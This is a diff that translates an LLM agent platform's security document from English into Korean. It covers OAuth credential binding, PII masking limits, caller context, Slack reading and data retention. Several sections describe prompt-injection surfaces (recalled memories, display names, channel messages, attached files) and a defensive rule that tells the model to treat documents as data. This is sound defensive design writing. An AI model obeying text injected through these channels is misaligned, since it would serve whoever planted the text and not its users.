+  때문이다. `iss` 가 없는 것은 서버의 메타데이터가
+  `authorization_response_iss_parameter_supported` 를 광고할 때만 치명적이다. 같은 확인이 에러
+  응답에도 돌기 때문에, 이 앱이 귀속시킬 수 없는 리다이렉트에서 온 제공자 제어
+  `error_description` 텍스트는 결코 중계되지 않는다.
+- **자격 증명에 대한 issuer 바인딩**(SEP-2352): 연결의 클라이언트 자격 증명은 그것이 등록된
+  issuer 를 지니고, 그 token 은 발행될 때의 `resource` 를 지닌다. 무엇이든 건네주기 전에 둘 다
+  확인된다 — 갱신 경로에서 *그리고* 살아 있는 token 을 읽기만 하는 경로에서도. bearer token 에는
+  audience 가 있고, 확인 없이 하나를 내주는 것은 클라이언트 시크릿을 쓰는 것과 같은 실수이기
+  때문이다. **둘 다 기본값으로 채우는 것이 아니라 필수다.** 그것들이 기록되기 전에 쓰인 행은
+  *연결 없음* 으로 되읽히고, 그래서 콘솔이 재연결을 제안한다. 예전의 폴백은 그런 행이 지금
+  항목이 가리키는 것에 속한다고 가정했는데, 그 가정을 하지 않으려고 이 필드들이 존재하는 것이다
+  — 그리고 추측에 대고 확인한 token 은 확인된 것이 아니다. issuer 를 지니지 않은 state 의
+  pending authorization 에도 같은 것이 적용된다. 확인 없이 완료하는 대신 거부한다.
+- **항목의 URL 을 편집하면 그 `auth` 블록은 통째로 버려진다.** 그 블록은 옛 주소의 well-known
+  문서에서 읽은 것이다. 항목은 admin 이 Discover 를 다시 돌릴 때까지 자기 헤더로 되돌아간다.
+  다시 돌리고 나면, 위의 두 확인이 옛 서버에 속했던 모든 연결을 잡아낸다. 항목을 지우고 같은
+  이름으로 다시 만드는 것도 같은 방식으로 잡힌다 — 레지스트리는 admin 소유인데 연결은 소유자
+  소유이고 그 둘을 잇는 유일한 것이 이름이므로, 이것은 중요하다.
+- **클라이언트를 얻는 방법은 명세 자신의 순서를 따른다**: 이미 보유한 자격 증명(한 번
+  등록했거나 손으로 입력한 것), 그다음 Client ID Metadata Document, 그다음 동적 등록, 그다음
+  소유자가 무엇을 해야 하는지 밝히는 에러. 등록은 프로토콜 `2026-07-28` 부터 그 문서 방식에
+  밀려 deprecated 이므로 `client_id_metadata_document_supported` 를 광고하는 서버에는 결코
+  등록하지 않는다 — 하지만 그 밖에 아무것도 광고하지 않는 서버들을 위해 남겨 둔다. 2025년대
+  릴리스의 authorization 서버가 전부 그렇다. 걷어냈다가 되돌린 적이 있다. 동작하던 연결을
+  연결 불가능하게 만들고, 그 소유자에게 자기가 통제하지도 못하는 리비전 날짜를 두고 손으로
+  앱을 등록하러 가라고 말하게 된다.
+- **문서는 제공자가 그것을 가져올 수 있는 곳에서만 경로가 된다.** `client_id` 는
+  *authorization 서버* 가 가져가는 URL 이므로, 공개 베이스가 `http://localhost` 이거나 내부
+  호스트명인 배포는 아무 데도 해석되지 않는 것을 발행한다 — 그리고 제공자는 사용자가 승인한
+  *뒤에야* 그것을 *Unknown OAuth client* 라고 말하는데, 이는 URL 의 문제가 아니라 클라이언트의
+  문제처럼 읽힌다. 그 주소는 항목 자신의 엔드포인트가 받는 것과 같은 https·공개 라우팅 가능
+  확인을 받는다. 그것을 통과하지 못하면 등록으로 넘어가고, 넘어갈 등록이 없을 때의 거부는
+  제공자가 아니라 베이스 URL 을 지목한다. 저장된 문서의 `client_id` 가 더 이상 이 배포가 제공할
+  그것이 아니면 같은 이유로 다시 만들어진다 — 그러지 않으면 행은 `clientId` 를 계속 갖고 있어
+  모든 분기가 건너뛰어지고, 가져올 수 없는 같은 URL 이 영원히 제시된다.
+- 동적 등록(RFC 7591)은 OpenID Connect 기본값이 적용되게 두는 대신
+  `application_type: "web"` 을 선언한다(SEP-837). 시크릿이 없는 public 클라이언트는 서버의
+  메타데이터가 무엇을 선호했든 `none` 을 보낸다.
+- **Client ID Metadata Document 는 project 별로 공개 제공된다.**
+  `/api/mcps/oauth/client-metadata/{project}` 이며, 세션 확인이 없는 유일한 MCP 라우트이고
+  의도적으로 그렇다. 그 독자는 URL 인 `client_id` 를 해석하는 authorization 서버이며, 제공자가
+  도는 어디에서든 쿠키 없이 도착한다. 그 안에는 시크릿이 하나도 없다. 이 배포의 이름과 자신이
+  받아들이는 단 하나의 redirect URI 를 밝히는데, 그것은 예전에 등록이 POST 본문으로 보내던
+  것이다. 그 안의 `client_id` 는 그것을 가져온 URL 과 같아야 하므로, 둘 다 하나의
+  함수(`clientMetadataUrl` / `clientMetadataDocument`)가 **설정된** 공개 베이스에서 만든다 —
+  요청에서 만드는 일은 결코 없다. 요청에서 만들면 호출자가 자기 호스트로의 리다이렉트를 승인하는
+  문서를 게시할 수 있게 된다. project 는 조회하지 않는다. 요청마다 데이터베이스를 읽는 공개
+  엔드포인트는 인증되지 않은 트래픽을 그 안으로 초대하는 셈이고, 모르는 이름에 404 를 주면 어떤
+  project 가 존재하는지가 새어 나간다. 존재하지 않는 project 의 문서는 무해하다 — 그것이 시작할
+  수 있는 authorization 은 콜백에 도착하고, 콜백은 연결을 찾지 못해 멈춘다.
+- **그런 클라이언트는 구조상 public 이므로**, 이 플로우의 방어는 공유 시크릿이 아니라 PKCE 와 그
+  고정된 redirect URI 다. 다른 누군가가 시작한 authorization 도 결국 자기 code 를 이 배포의
+  콜백으로 배달하고, 거기서는 verifier 없이는 쓸모가 없다.
+- **위의 issuer 바인딩 규칙은 그것에 대해서는 뒤집힌다.** 등록했거나 손으로 입력한 `client_id`
+  는 그것을 발급한 서버를 떠나면 의미가 없고, 그래서 issuer 로 키잉되며 issuer 가 바뀌면 다시
+  등록된다 — 또는 여기서 다시 발급할 수 있는 것이 아무것도 없을 때는, 소유자가 등록해야 하는
+  서버를 지목하며 거부된다. 메타데이터 문서의 `client_id` 는 자체 호스팅되고 요청받은 서버가
+  그때그때 해석하므로 항목이 옮겨져도 살아남는다 — 그것을 거부하는 것은 가지고 있지도 않은 자격
+  증명을 이유로 동작하던 연결을 깨뜨리는 일이 될 것이다.
+- 콜백은 **project 소유권을 다시 확인한다.** 사용자가 제공자에 가 있는 동안 소유권이 바뀔 수 있기
+  때문이다.
 
-Refresh is a compare-and-set on the stored refresh token: providers that rotate them revoke
-the previous one, so the loser of a race uses the winner's token. Only a **refused grant**
-marks a connection `needs_reauth`; a 5xx or timeout leaves it alone. (Refresh timing is a
-design constraint rather than a security one — see
-[design/mcp.md](design/mcp.md#oauth).)
+갱신은 저장된 refresh token 에 대한 compare-and-set 이다. refresh token 을 회전시키는 제공자는
+이전 것을 폐기하므로, 경쟁에서 진 쪽은 이긴 쪽의 token 을 쓴다. **거절된 grant** 만이 연결을
+`needs_reauth` 로 표시한다. 5xx 나 타임아웃은 그대로 둔다. (갱신 타이밍은 보안 제약이 아니라
+설계 제약이다 — [design/mcp.md](design/mcp.md#oauth) 참고.)
 
-A connection **supplies** credentials rather than gating the server. The resolved token is
-applied last at dispatch — over the registry entry's headers and the version's overrides — so
-a version cannot substitute its own `Authorization` for the project's connection. When no
-connection is available, the server still runs on whatever those headers hold; it is dropped
-with a warning only when they hold nothing.
+연결은 서버를 게이트하는 것이 아니라 자격 증명을 **공급한다**. 해석된 token 은 디스패치 시
+마지막에 적용된다 — 레지스트리 항목의 헤더와 버전의 오버라이드 위에 — 그래서 버전이 project 의
+연결 대신 자기 `Authorization` 을 끼워 넣을 수 없다. 사용할 수 있는 연결이 없으면 서버는 그
+헤더들이 담고 있는 것으로 여전히 돌아간다. 그것들이 아무것도 담고 있지 않을 때만 경고와 함께
+드롭된다.
 
-## PII filtering, and where it stops
+## PII 필터링, 그리고 그것이 멈추는 곳
 
-Opt-in per version via `parameters.piiFiltering`. Emails, phone numbers, Korean registration
-numbers and payment card numbers in outbound messages and variables are replaced with
-reversible, format-preserving `[[PII:…]]` tokens
-before every LLM dispatch, and the originals are restored in responses — streaming included,
-with token-boundary buffering — so the model never sees the real values. The mapping carries
-across subagent transfers.
+`parameters.piiFiltering` 으로 버전별 옵트인. 나가는 메시지와 변수 안의 email, 전화번호, 한국
+등록번호, 결제 카드 번호는 모든 LLM 디스패치 전에 되돌릴 수 있고 형식을 보존하는 `[[PII:…]]`
+token 으로 치환되고, 응답에서 원본이 복원된다 — 스트리밍도 포함해서, token 경계 버퍼링과 함께 —
+그래서 모델은 실제 값을 결코 보지 않는다. 그 매핑은 subagent transfer 를 넘어 이어진다.
 
-**The boundary is the LLM channel and the engine's own context, not every outbound call.**
-When the model invokes an MCP tool, `callMcpTool` receives the **restored** arguments — a tool
-asked to email `a@b.com` needs the address, not a token. A connected MCP server therefore
-still sees the PII it is passed. (A subagent transfer is the opposite: the child agent
-receives the masked message.) Review MCP server registrations on their own terms;
-`piiFiltering` does not cover them.
+**경계는 LLM 채널과 엔진 자신의 컨텍스트이지, 모든 아웃바운드 호출이 아니다.** 모델이 MCP
+도구를 호출하면 `callMcpTool` 은 **복원된** 인자를 받는다 — `a@b.com` 으로 메일을 보내라는
+도구에는 token 이 아니라 그 주소가 필요하다. 따라서 연결된 MCP 서버는 자신에게 전달된 PII 를
+여전히 본다. (subagent transfer 는 정반대다. 자식 agent 는 마스킹된 메시지를 받는다.) MCP 서버
+등록은 그 자체의 기준으로 검토하라. `piiFiltering` 은 그것을 다루지 않는다.
 
-**Capability discovery is outside it too, and for a structural reason.** A version with
-`dynamicCapabilities` on searches the catalog with the newest user turns (a short window,
-not just the last) among its queries, and that text goes to the embedding provider *verbatim* —
-`resolveRunTools` runs
-before `engine.runAgent`, which is where the filter is constructed and the only place that
-owns how a run masks. So a request carrying a phone number reaches Bedrock or the configured
-`/embeddings` endpoint unmasked even with filtering on, one call ahead of the dispatch that
-would have masked it. In practice that is the same provider account the chat channel already
-uses, which is why it is documented here rather than treated as a separate exposure — but it
-is a decision to make when turning the flag on, not something the filter covers. A deployment
-that cannot accept it leaves `dynamicCapabilities` off on filtered versions, which is the
-default. **`memoryRecall` sits at the same spot**: the newest user turn is sent to the bound
-memory server as the `recall` query before the engine constructs the filter — a connected MCP
-server already sees restored tool arguments, so this is the same exposure a turn earlier, and
-the same decision to make when turning the flag on. What comes back enters the *system
-prompt* as recalled text, and the system prompt **is** masked on a filtered version — so a
-stored memory that names an email reaches the model as `[[PII:…]]` even though the memory
-server holds it in the clear; what a memory server holds is governed by that server's own
-registration, not by this flag.
+**capability discovery 도 그 밖에 있고, 구조적인 이유가 있다.** `dynamicCapabilities` 가 켜진
+버전은 가장 최근 사용자 턴들(마지막 하나만이 아니라 짧은 창)을 자기 질의 중 하나로 삼아
+카탈로그를 검색하고, 그 텍스트는 임베딩 제공자에게 *그대로* 간다 — `resolveRunTools` 는
+`engine.runAgent` 보다 먼저 도는데, 필터가 구성되는 곳이자 런이 어떻게 마스킹하는지를 소유하는
+유일한 자리가 바로 거기이기 때문이다. 그래서 전화번호를 실은 요청은 필터링이 켜져 있어도
+마스킹되지 않은 채 Bedrock 또는 설정된 `/embeddings` 엔드포인트에 도달한다. 그것을 마스킹했을
+디스패치보다 한 호출 앞서서다. 실제로는 chat 채널이 이미 쓰고 있는 것과 같은 제공자 계정이고,
+그래서 별도의 노출로 다루는 대신 여기에 적어 둔다 — 하지만 이는 플래그를 켤 때 내려야 하는
+결정이지 필터가 덮어 주는 무언가가 아니다. 그것을 받아들일 수 없는 배포는 필터링된 버전에서
+`dynamicCapabilities` 를 꺼 두고, 그게 기본값이다. **`memoryRecall` 도 같은 자리에 있다.**
+엔진이 필터를 구성하기 전에 가장 최근 사용자 턴이 `recall` 질의로 바인딩된 메모리 서버에
+전송된다 — 연결된 MCP 서버는 이미 복원된 도구 인자를 보므로 이것은 한 턴 앞선 같은 노출이고,
+플래그를 켤 때 내려야 하는 같은 결정이다. 돌아온 것은 회상된 텍스트로 *시스템 프롬프트* 에
+들어가고, 시스템 프롬프트는 필터링된 버전에서 마스킹**된다** — 그래서 email 을 지목하는 저장된
+메모리는 메모리 서버가 그것을 평문으로 갖고 있더라도 모델에게는 `[[PII:…]]` 로 도달한다. 메모리
+서버가 무엇을 보관하는지는 이 플래그가 아니라 그 서버 자신의 등록이 관장한다.
 
-**Recalled text is a prompt-injection surface of its own.** A memory is written by
-`remember` — by the model, from a user's words, in whatever conversation, by anyone who can
-run the project — and read back into the *system message* of every later conversation that
-recalls it. That is one step further than a tool result: it persists, and it crosses
-conversations and people. The block is therefore fenced (`<recalled>…</recalled>`), quoted
-line by line so a stored `## …` heading cannot pose as one of the prompt's own sections, and
-framed as background rather than instructions (`rememberedBlock` in
-`src/application/llm/agentAssembly.ts`). That bounds how a memory *reads*; it does not make
-a model immune to text it reads, any more than the caller-name sanitising does. Which memories
-a project keeps is a review of that server's `remember` policy, on the server's own terms.
+**회상된 텍스트는 그 자체로 프롬프트 인젝션 표면이다.** 메모리는 `remember` 가 쓴다 — 모델이,
+사용자의 말에서, 어떤 대화에서든, project 를 실행할 수 있는 누구에 의해서든 — 그리고 그것을
+회상하는 이후 모든 대화의 *시스템 메시지* 로 되읽힌다. 그것은 도구 결과보다 한 걸음 더 나간
+것이다. 지속되고, 대화와 사람을 넘나든다. 그래서 그 블록은 울타리에 넣고
+(`<recalled>…</recalled>`), 저장된 `## …` 헤딩이 프롬프트 자신의 섹션 중 하나인 척하지 못하도록
+줄 단위로 인용하며, 지시가 아니라 배경으로 틀 지운다(`src/application/llm/agentAssembly.ts` 의
+`rememberedBlock`). 그것은 메모리가 어떻게 *읽히는지* 를 한정한다. 호출자 이름 정제와
+마찬가지로, 모델이 자기가 읽는 텍스트에 면역이 되게 만들지는 못한다. project 가 어떤 메모리를
+보관하는지는 그 서버 자신의 기준으로 그 서버의 `remember` 정책을 검토할 일이다.
 
-Detection is regex-based and covers emails, phone numbers, Korean resident/foreigner
-registration numbers (hyphenated form, with the date half validated) and payment card
-numbers (13-19 digits, Luhn-checked so an order id is not masked *as a card* — a span that
-fails the check is re-scanned by the other patterns, keeping whatever the phone pattern
-masked before the card entity existed). Treat it as best-effort masking, not a guarantee.
-Off is byte-identical to the unfiltered path.
+탐지는 정규식 기반이고 email, 전화번호, 한국 주민/외국인등록번호(하이픈 형식, 날짜 절반은
+검증한다), 결제 카드 번호(13-19자리, Luhn 검사를 하므로 주문 id 가 *카드로* 마스킹되지 않는다 —
+검사를 통과하지 못한 구간은 다른 패턴들이 다시 훑어서, 카드 엔티티가 생기기 전에 전화번호
+패턴이 마스킹하던 것을 그대로 유지한다)를 다룬다. 보장이 아니라 최선 노력 마스킹으로 다뤄라.
+꺼져 있을 때는 필터링하지 않는 경로와 바이트 단위로 동일하다.
 
-## Caller context
+## 호출자 컨텍스트
 
-Opt-in per version via `parameters.callerContext`. With it on, a Slack run tells the model who
-is asking — display name, timezone, and the avatar's URL — and labels each speaker when a thread
-holds more than one human. A Telegram run does the same with what an update carries — the
-sender's name, and nothing else: Telegram hands over no timezone and no email.
+`parameters.callerContext` 로 버전별 옵트인. 켜져 있으면 Slack 런은 누가 묻고 있는지를 모델에게
+알려 주고 — 표시 이름, 시간대, 아바타의 URL — 한 스레드에 사람이 둘 이상이면 화자마다 라벨을
+붙인다. Telegram 런은 업데이트가 실어 오는 것으로 같은 일을 한다 — 보낸 사람의 이름, 그리고 그
+밖에는 아무것도 없다. Telegram 은 시간대도 email 도 넘겨주지 않는다.
 
-**A name is PII that `piiFiltering` does not mask.** Its patterns match emails, phone and
-registration/card numbers,
-and a person's name matches neither, so anything the caller block carries reaches the model as
-written even with filtering on. That is why the block carries **no email**, and why this is a
-per-version opt-in rather than default behaviour: turning it on is a decision to put real
-people's names into prompts and into whatever the provider logs.
+**이름은 `piiFiltering` 이 마스킹하지 않는 PII 다.** 그 패턴들은 email, 전화번호,
+등록번호/카드 번호에 맞고 사람의 이름은 그 어느 것에도 맞지 않으므로, 호출자 블록이 싣는 것은
+필터링이 켜져 있어도 쓰인 그대로 모델에 도달한다. 그래서 그 블록은 **email 을 싣지 않으며**,
+그래서 이것이 기본 동작이 아니라 버전별 옵트인이다. 켜는 것은 실제 사람의 이름을 프롬프트에,
+그리고 제공자가 로깅하는 무엇에든 집어넣겠다는 결정이다.
 
-The opt-in gates the lookup as well as the prompt. A version with it off causes no `users.info`
-call at all, so a project that has not opted in never sends a member's id to Slack's profile
-API — and on Telegram, where the name arrives with the message, it is not written into the
-conversation transcript either (see [Data exposure and retention](#data-exposure-and-retention)). A **transfer carries the caller** to the child (`RunOrigin`), where the child version's
-own opt-in decides again — so a name reaches only versions that asked for one, however many
-hops away, and a project whose owner never opted in never sees it. Resolved profiles are cached in memory per workspace (an hour; a failure, a minute), bounded
-in size, and never persisted.
+옵트인은 프롬프트뿐 아니라 조회도 게이트한다. 꺼진 버전은 `users.info` 호출을 아예 일으키지
+않으므로, 옵트인하지 않은 project 는 멤버의 id 를 Slack 의 프로필 API 로 결코 보내지 않는다 —
+그리고 이름이 메시지와 함께 도착하는 Telegram 에서는 그것이 대화 트랜스크립트에 쓰이지도
+않는다([데이터 노출과 보존](#데이터-노출과-보존) 참고). **transfer 는 호출자를
+자식에게 실어 나르고**(`RunOrigin`), 거기서 자식 버전 자신의 옵트인이 다시 결정한다 — 그래서
+이름은 몇 홉 떨어져 있든 그것을 요청한 버전에만 도달하고, 소유자가 한 번도 옵트인하지 않은
+project 는 그것을 결코 보지 않는다. 해석된 프로필은 워크스페이스별로 메모리에
+캐시되고(1시간, 실패는 1분), 크기가 제한되며, 결코 영속되지 않는다.
 
-**A display name is attacker-controlled.** Anyone can set their own to anything, and it lands in
-the system prompt — through the speaker labels on a shared thread, in *other people's*
-conversations, not only their own. `callerFrom` (`src/domain/execution/actor.ts`) is the single
-place a `RunCaller` is built and therefore the single place its name is made safe: control
-characters are stripped, whitespace is collapsed to one line, the name is bounded at 60
-characters, and an avatar is accepted only if it is an `https:` URL. That does not make prompt
-injection impossible — the message body is untrusted too — but it stops identity metadata from
-being a place to hide instructions a reader cannot see.
+**표시 이름은 공격자가 통제한다.** 누구나 자기 것을 무엇으로든 설정할 수 있고, 그것이 시스템
+프롬프트에 실린다 — 공유 스레드의 화자 라벨을 통해, 자기 대화만이 아니라 *다른 사람의* 대화
+안에서. `callerFrom`(`src/domain/execution/actor.ts`)은 `RunCaller` 가 만들어지는 유일한
+자리이고 따라서 그 이름을 안전하게 만드는 유일한 자리다. 제어 문자는 제거하고, 공백은 한 줄로
+접고, 이름은 60자로 제한하며, 아바타는 `https:` URL 일 때만 받아들인다. 그것이 프롬프트
+인젝션을 불가능하게 만들지는 않지만 — 메시지 본문도 신뢰되지 않는다 — 신원 메타데이터가 독자가
+볼 수 없는 지시를 숨길 자리가 되는 것은 막는다.
 
-## Reading the Slack workspace
+## Slack 워크스페이스 읽기
 
-Opt-in per version via `parameters.slackWorkspace`. With it on, a run may read the channel
-history, threads and user names of the workspace its project's bot is installed in.
+`parameters.slackWorkspace` 로 버전별 옵트인. 켜져 있으면 런은 자기 project 의 봇이 설치된
+워크스페이스의 채널 히스토리, 스레드, 사용자 이름을 읽을 수 있다.
 
-**Projects are a shared catalog.** Anyone who can run a project can therefore read anything its
-bot can — which is every channel the bot was invited to, including private ones where
-`groups:history` applies. That is the whole reason this is a per-version opt-in rather than a
-capability every Slack-connected project has: turning it on is a decision to make a channel's
-contents reachable to a wider set of people than the channel's own membership.
+**Project 는 공유 카탈로그다.** 따라서 project 를 실행할 수 있는 사람은 누구나 그 봇이 읽을 수
+있는 것을 읽을 수 있다 — 봇이 초대된 모든 채널이며, `groups:history` 가 적용되는 비공개 채널도
+포함이다. 그것이 이것을 Slack 에 연결된 모든 project 가 갖는 capability 가 아니라 버전별
+옵트인으로 만든 이유 전부다. 켜는 것은 어떤 채널의 내용을 그 채널 자신의 멤버보다 더 넓은
+사람들에게 닿게 하겠다는 결정이다.
 
-Two things are refused by construction rather than by omission:
+두 가지는 빠뜨려서가 아니라 구조적으로 거부된다:
 
-- **No writes.** `chat:write` is granted to the bot — the reply transport needs it — and is
-  deliberately not reachable from any tool. A run is steered by text it did not write; a run
-  that could also post is one where a message planted in a channel can make the bot speak
-  somewhere else.
-- **No email reaches the model**, though `users:read.email` is granted. `SlackUser` and
-  `SlackUsers` answer with a name, job title, timezone, status line and avatar — everything a
-  colleague sees by clicking the profile — and never the address. That is the rule
-  [caller context](#caller-context) already applies, for the same reason: an email identifies a
-  person outside Slack and no answer needs one to be written well.
+- **쓰기 없음.** `chat:write` 는 봇에게 부여돼 있고 — 답장 전송에 필요하다 — 의도적으로 어떤
+  도구에서도 닿을 수 없다. 런은 자기가 쓰지 않은 텍스트에 조종된다. 글도 올릴 수 있는 런은,
+  어떤 채널에 심어 둔 메시지가 봇으로 하여금 다른 곳에서 말하게 만들 수 있는 런이다.
+- **email 은 모델에 도달하지 않는다.** `users:read.email` 이 부여돼 있는데도 그렇다.
+  `SlackUser` 와 `SlackUsers` 는 이름, 직함, 시간대, 상태 문구, 아바타로 답한다 — 동료가
+  프로필을 클릭해서 보는 전부다 — 주소는 결코 답하지 않는다. 그것은
+  [호출자 컨텍스트](#호출자-컨텍스트)가 이미 적용하는 규칙이고, 이유도 같다. email 은 Slack 밖에서
+  사람을 식별하며, 어떤 답도 잘 쓰이기 위해 그것을 필요로 하지 않는다.
 
-  The address *is* read for one thing: **filing a run's output under its author**. A Slack actor
-  is a workspace id and the artifact owner index is keyed by email, so a picture somebody asked
-  the bot to draw was reachable only through its project, never from their own gallery. It is
-  carried as `ownerEmail`, separate from the actor — that key groups usage by surface and decides
-  which tier's spend cap and concurrency limit a run answers to, and an unregistered address
-  resolves to `guest` (one concurrent run, $2 a month), which is a change belonging to a
-  different decision. `toUserDetail` does not copy the address, so nothing a tool returns can
-  carry it, and the lookup is not gated on `callerContext`: that parameter decides what the model
-  is told, and a person's own pictures going missing from their own gallery is not something it
-  should be able to cause.
+  주소를 *읽기는* 한다. 한 가지 용도, **런의 결과물을 그 작성자 아래에 정리하기** 위해서다.
+  Slack actor 는 워크스페이스 id 이고 artifact 소유자 인덱스는 email 로 키잉되므로, 누군가 봇에게
+  그려 달라고 한 그림은 그 project 를 통해서만 닿을 수 있었고 자기 갤러리에서는 결코 닿을 수
+  없었다. 그것은 actor 와 분리된 `ownerEmail` 로 실려 나른다 — 그 키는 표면별로 usage 를 묶고
+  런이 어느 tier 의 지출 상한과 동시성 제한에 답할지를 결정하는데, 등록되지 않은 주소는
+  `guest`(동시 런 1개, 월 $2)로 해석되며 이는 다른 결정에 속하는 변경이다. `toUserDetail` 은 그
+  주소를 복사하지 않으므로 도구가 반환하는 어떤 것도 그것을 실을 수 없고, 그 조회는
+  `callerContext` 에 게이트되지 않는다. 그 파라미터는 모델이 무엇을 듣는지를 결정하는 것이고,
+  어떤 사람의 그림이 자기 갤러리에서 사라지는 일은 그것이 일으킬 수 있어야 하는 것이 아니다.
 
-What *is* carried in is untrusted in exactly the way an attached document is: a channel's
-messages were written by whoever is in that channel, and they reach the model as text. PII
-filtering applies to the tool result like any other (`parameters.piiFiltering`), and the
-per-turn tool-result budget bounds its size — a transcript's length is Slack's to decide, so it
-goes through the fit rather than being charged whole.
+*안으로* 실려 오는 것은 첨부된 문서와 똑같은 방식으로 신뢰되지 않는다. 채널의 메시지는 그 채널에
+있는 누구든 쓴 것이고, 그것이 텍스트로 모델에 도달한다. PII 필터링은 다른 것과 마찬가지로 그
+도구 결과에도 적용되며(`parameters.piiFiltering`), 턴별 도구 결과 예산이 그 크기를 제한한다 —
+트랜스크립트의 길이는 Slack 이 정하는 것이므로, 통째로 청구되는 대신 fit 을 거친다.
 
-The reader holds the bot token, bound at construction. A tool argument naming the workspace
-would let the model choose one, and there is no request for which that is the right shape.
+리더는 봇 token 을 쥐고 있고, 그것은 생성 시점에 바인딩된다. 워크스페이스를 지목하는 도구 인자는
+모델이 워크스페이스를 고르게 만들 것이고, 그것이 올바른 모양인 요청은 없다.
 
-## Attached documents
+## 첨부 문서
 
-A document's text goes into the turn, so **anything anyone can attach can say anything**. In a
-Slack channel that is not only the person asking — it is whoever can drop a file where the bot
-can see it.
+문서의 텍스트는 턴 안으로 들어가므로, **누구든 첨부할 수 있는 것은 무엇이든 말할 수 있다.**
+Slack 채널에서 그것은 묻는 사람만이 아니다 — 봇이 볼 수 있는 곳에 파일을 떨어뜨릴 수 있는
+누구든이다.
 
-What is done about it: every document is wrapped by `framedDocument`
-(`src/application/llm/documentParts.ts`), which names the file, marks where it ends, and tells
-the model to treat the span as data and never as instructions. The name is JSON-escaped so a
-crafted filename cannot forge the end marker.
+이에 대해 하는 일: 모든 문서는 `framedDocument`(`src/application/llm/documentParts.ts`)가
+감싸며, 파일의 이름을 밝히고 어디서 끝나는지를 표시하고 그 구간을 데이터로 다루고 결코 지시로
+다루지 말라고 모델에게 말한다. 이름은 JSON 이스케이프되므로 조작된 파일명이 끝 표시를 위조할 수
+없다.
 
-**That is a mitigation, not a fix.** No wording makes injected text safe, and the message body
-was already untrusted. Size an agent's authority to it: one that reads attachments should not
-hold permissions you would not give to a stranger with a file.
+**그것은 완화이지 해결이 아니다.** 어떤 문구도 주입된 텍스트를 안전하게 만들지 못하고, 메시지
+본문은 이미 신뢰되지 않았다. agent 의 권한을 그에 맞춰 잡아라. 첨부를 읽는 agent 는 파일을 든
+낯선 사람에게 주지 않을 권한을 쥐고 있어서는 안 된다.
 
-Other properties worth knowing:
+알아 둘 만한 다른 속성들:
 
-- **Documents are read, never executed or rendered.** Extraction yields text and nothing else;
-  HTML is read as its markup rather than fetched, scripted or resolved.
-- **Nothing fetches on the document's behalf.** A URL inside an attachment is text like any
-  other; only a tool the version bound can act on it, under that tool's own guard.
-- **Text goes through the PII filter** like the rest of the turn when the version opts in —
-  with the same limits (emails, phone numbers, Korean registration numbers and card
-  numbers — not names).
-- **Chats store the extracted text, not the file**, under the chat's own retention and the
-  owner-private read rule. A 10MB PDF is never persisted; up to 40,000 characters per turn of
-  what was read is.
+- **문서는 읽힐 뿐, 실행되거나 렌더링되지 않는다.** 추출은 텍스트만 내놓는다. HTML 은
+  가져오거나 스크립트를 돌리거나 해석하는 대신 그 마크업 그대로 읽힌다.
+- **문서를 대신해 무언가를 가져오는 것은 없다.** 첨부 안의 URL 은 다른 것과 마찬가지로 텍스트일
+  뿐이다. 버전이 바인딩한 도구만이 그것에 작용할 수 있고, 그 도구 자신의 가드 아래에서 그렇다.
+- **텍스트는 PII 필터를 지난다.** 버전이 옵트인하면 턴의 나머지와 마찬가지이고, 한계도 같다
+  (email, 전화번호, 한국 등록번호, 카드 번호 — 이름은 아니다).
+- **Chat 은 파일이 아니라 추출된 텍스트를 저장한다.** chat 자신의 보존 기간과 소유자 전용 읽기
+  규칙 아래에서다. 10MB PDF 는 결코 영속되지 않는다. 읽어 낸 것 중 턴당 최대 40,000자가 저장된다.
 
-## Data exposure and retention
+## 데이터 노출과 보존
 
-- Traces store **bounded metadata only** — character counts, tokens, cost, duration, subagent
-  trace ids. Raw prompts and tool results are not persisted, but a trace's `error` and
-  `warnings` keep up to 1,000 characters of failure text verbatim, and a provider or tool
-  error string can embed content.
-- `/api/metrics` names no project, user or model. The only label any metric carries is a
-  histogram's `le`.
-- Log lines carry a run correlation id, never prompt content.
-- Traces, usage rows, chats, trigger deliveries and inbound A2A tasks all expire via DynamoDB
-  TTL — see [OPERATIONS.md](OPERATIONS.md#row-retention).
-- **Telegram conversation transcripts** keep the *text* of every turn exchanged with a
-  project's bot for seven days — the question and the answer, per conversation — because the
-  Bot API hands back no history and a follow-up has to carry the question before it. It is
-  user text at rest, like a chat message; unlike a chat it is read by nothing but the next
-  run in that conversation. The sender's Telegram user id is stored beside a turn; the
-  sender's *name* only when the version opted into `callerContext`.
-- **Generated images** are stored under an unguessable UUID key with `S3_BUCKET_NAME` set, and
-  a chat row keeps the **object key** — never an address. `ARTIFACT_ACCESS_MODE=authenticated`
-  (the default) pre-signs URLs at read time with a lifetime chosen for the reader: 15 minutes
-  for the chat view; the whole run deadline plus a margin for a replay, because the URL is
-  fetched by the *model provider* at whatever point in the run it reaches the turn; and seven
-  days — the SigV4 ceiling — for a link written into something durable, a Slack thread or a
-  stored A2A task, held by the audience that could already read the answer it came with
-  (`src/application/artifact/urlTtl.ts`). The bucket stays private. `public` instead returns
-  a permanent direct S3 URL. That mode requires an explicit public-read bucket policy and
-  exposes the bytes to anyone who obtains the URL; application authentication still protects
-  gallery metadata and deletion, not the object. **It pre-signs anyway wherever the address
-  is a download rather than a view** — the filename a browser saves under is carried by
-  `ResponseContentDisposition`, which S3 rejects on an anonymous GET, so an unsigned link can
-  only ever save the object under its UUID key.
-  - Legacy rows may carry a public `url` and are read back unchanged. Rewriting them
-    would change nothing about who can reach those objects, which are already public — so
-    **if the bucket was ever public-read, its existing objects still are.** Making it private
-    is the operator's step, and old rows stop resolving when it happens.
-  - **Nothing in the app expires an object.** DynamoDB TTL removes a row silently — the app
-    never observes the expiry — so only the bucket can expire objects on the same clock.
-    Attach a lifecycle rule per prefix; it is on the deployment checklist in
-    [OPERATIONS.md](OPERATIONS.md#operational-checklist-for-a-new-deployment).
-- **Artifact rows** name every object a run produced, which is what makes a stored image or
-  document listable and removable at all. Three consequences worth stating:
-  - A row keeps a **500-character excerpt of the prompt** so a gallery is legible. That is user
-    text living for `ARTIFACT_RETENTION_DAYS`, past the chat message that carried it. PII
-    filtering bounds what the *model* sees, never what is stored.
-  - A project's artifacts tab is readable by the project's owner and by admins — the same rule
-    traces use, and for the same reason (they hold other people's runtime output). It is a
-    wider exposure than traces in practice: traces are sampled and keep 30 days, artifacts are
-    every object and keep 180.
-  - Deleting an artifact removes the object first and the row second, so an interrupted delete
-    converges on retry. A chat message keeps its own copy of the key, so the transcript renders
-    the image as unavailable afterwards; the confirmation says so before the fact.
